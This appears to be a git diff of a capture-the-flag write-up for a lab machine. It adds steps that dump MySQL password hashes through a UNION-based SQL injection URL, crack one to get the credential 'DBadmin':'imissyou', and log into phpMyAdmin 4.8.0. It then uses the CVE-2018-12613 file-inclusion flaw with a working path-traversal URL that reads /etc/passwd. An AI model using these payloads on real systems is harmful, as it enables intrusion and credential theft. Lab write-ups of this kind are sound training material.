@@ -191,17 +191,39 @@ http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(column_name),4
 ```
 http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(User,":",Password),4,5,6,7+from+mysql.user;-- -
 
-http://10.10.10.143/room.php?cod=55+union+select+1,2,(SELECT group_concat(user,":",password) FROM mysql.user),4,5,6,7;-- -
+http://10.10.10.143/room.php?cod=55+union+select+1,2,(SELECT group_concat(User,":",Password) FROM mysql.user),4,5,6,7;-- -
 ```
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/982a4737-3951-4842-9cf8-5cba91bff2d8)
 
 
 
-+ x
++ Crack the hash with [crackstation](https://crackstation.net/), and credentials: `DBadmin`:`imissyou`.
 ```
 DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 ```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b0d83de8-95eb-4884-a745-25fe68550d89)
+
++ Get into the phpmyadmin site with the discovered credentials: `http://10.10.10.143/phpmyadmin/`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/456d2ac4-4fe4-4dd2-adf1-fe2ed4706eeb)
+
++ The version of phpMyAdmin is 4.8.0, and check whether it has any exploits: `searchsploit phpMyAdmin 4.8`
++ There's a local file include (LFI) vulnerability that allows for remote code execution (RCE) with CVE-2018-12613 [1](https://www.exploit-db.com/exploits/44928) in this version. 
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4f986e6f-096f-4030-9912-23431041e16f)
+
++ Visit `http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd`, and see the include works.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ec97f8b9-7bf0-4506-b652-ec25d57cbb32)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/658da495-e482-42e9-a463-b695e97e7f4f)
+
+
+
+
+
 
 
 
